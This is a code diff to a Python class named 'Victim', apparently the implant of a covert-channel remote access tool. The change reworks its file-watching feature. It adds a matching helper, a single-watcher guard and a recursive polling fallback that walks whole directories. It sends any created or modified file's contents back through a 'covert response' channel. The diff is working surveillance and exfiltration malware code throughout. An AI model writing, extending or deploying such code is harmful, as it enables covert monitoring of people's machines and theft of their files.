@@ -372,6 +372,10 @@ class Victim:
     def start_watcher(self, path):
         """Watch a file or directory for changes."""
 
+        if self.watcher_thread:
+            self.send_covert_response("Watcher already running.\n")
+            return
+
         if not PYINOTIFY_AVAILABLE:
             self._start_watcher_polling(path)
             return
@@ -401,27 +405,29 @@ class Victim:
                     watch_self.victim = victim_instance
                     watch_self.target_file = target_file
 
+                def _match(watch_self, pathname):
+                    if watch_self.target_file is None:
+                        return True
+                    return pathname.endswith(watch_self.target_file)
+
                 def process_IN_CREATE(watch_self, event):
-                    if not event.dir:
-                        if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
-                            watch_self.victim._send_watched_file(event.pathname, 1)
+                    if not event.dir and watch_self._match(event.pathname):
+                        watch_self.victim._send_watched_file(event.pathname, 1)
 
                 def process_IN_CLOSE_WRITE(watch_self, event):
-                    if not event.dir:
-                        if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
-                            watch_self.victim._send_watched_file(event.pathname, 2)
+                    if not event.dir and watch_self._match(event.pathname):
+                        watch_self.victim._send_watched_file(event.pathname, 2)
 
                 def process_IN_DELETE(watch_self, event):
-                    watch_self.victim.send_covert_response(
-                        f"[WATCH FILE] {event.pathname}\n"
-                        f"[EVENT] 3\n"
-                        f"[SIZE] 0\n"
-                        f"[WATCH END]\n"
-                    )
+                    if watch_self._match(event.pathname):
+                        watch_self.victim.send_covert_response(
+                            f"[WATCH FILE] {event.pathname}\n"
+                            f"[EVENT] 3\n"
+                            f"[SIZE] 0\n"
+                            f"[WATCH END]\n"
+                        )
 
             handler = WatchHandler(self, target_file)
-
-            self.watcher_observer = pyinotify.Notifier(wm, handler, timeout=1000)
 
             mask = (
                 pyinotify.IN_CREATE |
@@ -431,19 +437,17 @@ class Victim:
 
             wm.add_watch(watch_dir, mask, rec=True, auto_add=True)
 
+            self.watcher_observer = pyinotify.Notifier(wm, handler)
+
             def watch_loop():
-                while self.running and self.is_connected:
-                    try:
-                        self.watcher_observer.process_events()
-                        if self.watcher_observer.check_events():
-                            self.watcher_observer.read_events()
-                    except:
-                        break
+                try:
+                    self.watcher_observer.loop()
+                except Exception:
+                    pass
 
             self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
             self.watcher_thread.start()
 
-            # Send initial snapshot
             if os.path.isfile(path):
                 self._send_watched_file(path, 2)
 
@@ -454,37 +458,80 @@ class Victim:
 
     def _start_watcher_polling(self, path):
         """Fallback polling-based watcher if pyinotify unavailable."""
+
+        path = os.path.abspath(path)
+
         def watch_loop():
-            last_stat = None
+            last_state = {}
+
             while self.running and self.is_connected:
+
                 try:
-                    if os.path.exists(path):
-                        stat = os.stat(path)
-                        if last_stat and stat.st_mtime != last_stat.st_mtime:
-                            self._send_watched_file(path)
-                        last_stat = stat
-                    else:
-                        if last_stat:
-                            self.send_covert_response(f"[DELETED] {path}\n")
-                            last_stat = None
-                    time.sleep(5)
-                except Exception:
-                    pass
-        
+
+                    if os.path.isfile(path):
+
+                        if os.path.exists(path):
+                            stat = os.stat(path)
+
+                            if path not in last_state or stat.st_mtime != last_state[path]:
+                                self._send_watched_file(path, 2)
+
+                            last_state[path] = stat.st_mtime
+
+                        else:
+                            if path in last_state:
+                                self.send_covert_response(
+                                    f"[WATCH FILE] {path}\n"
+                                    f"[EVENT] 3\n"
+                                    f"[SIZE] 0\n"
+                                    f"[WATCH END]\n"
+                                )
+                                del last_state[path]
+
+                    elif os.path.isdir(path):
+
+                        for root, _, files in os.walk(path):
+                            for file in files:
+                                full = os.path.join(root, file)
+
+                                try:
+                                    stat = os.stat(full)
+
+                                    if full not in last_state or stat.st_mtime != last_state[full]:
+                                        self._send_watched_file(full, 2)
+
+                                    last_state[full] = stat.st_mtime
+
+                                except:
+                                    pass
+
+                    time.sleep(3)
+
+                except:
+                    time.sleep(3)
+
         self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
         self.watcher_thread.start()
 
+        self.send_covert_response(f"Watching {path} (polling mode)...\n")
+
     def stop_watcher(self):
         """Stop the file/directory watcher."""
+
         try:
+
             if self.watcher_observer:
-                self.watcher_observer.stop()
+                try:
+                    self.watcher_observer.stop()
+                except:
+                    pass
                 self.watcher_observer = None
-            
-            if self.watcher_thread and self.watcher_thread.is_alive():
+
+            if self.watcher_thread:
                 self.watcher_thread = None
-            
+
             self.send_covert_response("Watcher stopped.\n")
+
         except Exception as e:
             self.send_covert_response(f"Error stopping watcher: {e}\n")
 
